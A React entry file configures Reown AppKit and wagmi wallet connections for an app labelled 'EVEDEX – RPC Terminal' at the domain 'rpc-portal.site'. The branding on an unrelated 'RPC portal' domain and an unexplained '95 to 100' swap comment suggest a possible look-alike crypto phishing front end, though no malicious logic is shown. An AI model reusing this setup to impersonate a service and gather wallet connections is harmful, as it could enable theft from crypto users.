import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// 1. Setup QueryClient for React Query
const queryClient = new QueryClient();

// 2. Your Project Credentials
const projectId = '7a9898896e62061904fbceeb9d296eb1';
const networks = [mainnet, bsc, polygon];

// 3. Setup Wagmi Adapter
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true // Keeps connection stable on mobile refreshes
});

// 4. Initialize AppKit with "Deep Link" Fixes
createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  defaultNetwork: mainnet,
  metadata: {
    name: 'EVEDEX',
    description: 'RPC Terminal',
    url: 'https://rpc-portal.site', // CRITICAL: This must match your Reown Dashboard
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true, // Enables Gmail/Social login
    socials: ['google', 'x', 'apple'],
    swaps: true, // Enables the "95 to 100" logic
    onramp: true,
    analytics: true
  },
  themeMode: 'dark',
  allWallets: 'SHOW'
});

// 5. Render App with Providers
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
